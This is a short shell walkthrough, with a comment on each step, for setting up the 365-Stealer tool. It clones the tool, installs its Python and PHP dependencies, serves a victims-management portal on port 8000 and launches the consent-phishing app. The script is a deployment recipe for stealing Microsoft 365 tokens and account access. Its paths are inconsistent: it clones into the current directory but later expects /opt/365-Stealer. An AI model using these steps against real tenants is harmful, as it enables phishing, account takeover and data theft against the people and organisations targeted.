# Switch to the root user to ensure we have the necessary permissions for installations and modifications
sudo su

# Update the package lists for upgrades and new package installations
apt update

# Clone the 365-Stealer repository from GitHub
git clone https://github.com/AlteredSecurity/365-Stealer.git

# Navigate to the cloned repository directory
cd 365-Stealer

# Install Python package manager (pip) for Python 3
apt install python3-pip

# Install the required Python packages specified in the requirements file
pip install -r requirements.txt

# Install PHP, the popular general-purpose scripting language
apt install php

# Install the PHP Multibyte String module, necessary for managing non-ASCII string characters
apt install php-mbstring

# Install the PHP SQLite3 module for interacting with SQLite databases
apt install php8.2-sqlite3

# Verify the PHP installation by checking its version
php --version

# Navigate to the directory
cd /opt/365-Stealer/yourVictims/

# Start the PHP built-in server to run the management portal on port 8000, accessible from whiteListedIP address
php -S 0.0.0.0:8000

# Now navigate to this directory
cd /opt/365-Stealer/

# Check the options available for the 365-Stealer script
python3 365-Stealer.py -h

# Run the 365-Stealer application
python3 365-Stealer.py --run-app